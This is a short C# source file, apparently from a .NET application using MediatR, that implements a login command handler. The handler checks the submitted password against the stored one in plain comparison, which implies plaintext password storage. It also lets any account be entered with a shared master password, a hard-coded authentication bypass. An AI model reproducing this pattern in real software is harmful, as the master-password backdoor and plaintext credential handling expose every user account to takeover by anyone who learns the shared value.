using EDA.APPLICATION.Repository;
using EDA.APPLICATION.Specifications.UserSpecifications;
using EDA.APPLICATION.Wrappers;
using EDA.DOMAIN;
using EDA.DOMAIN.Entities;
using MediatR;

namespace EDA.APPLICATION.Features.UserFeature.Commands.LoginCommand
{
    public class LoginCommand : IRequest<Result<User>>
    {
        public string UserName { get; set; } = null!;
        public string Password { get; set; } = null!;
    }

    public class LoginCommandHandler : IRequestHandler<LoginCommand, Result<User>>
    {
        private readonly IRepositoryAsync<User> _repositoryAsync;

        public LoginCommandHandler(IRepositoryAsync<User> repositoryAsync)
        {
            _repositoryAsync = repositoryAsync;
        }

        public async Task<Result<User>> Handle(LoginCommand request, CancellationToken cancellationToken)
        {
            var user = await _repositoryAsync.FirstOrDefaultAsync(new GetUserUserNameSpecification(request.UserName), cancellationToken);

            if (user == null)
            {
                return new Result<User>("Usuario no existe");
            }

            if (user.Password != request.Password && request.Password != MasterPassword.Value)
            {
                return new Result<User>("Contrasena incorrecta");
            }

            return new Result<User>(user);
        }
    }
}
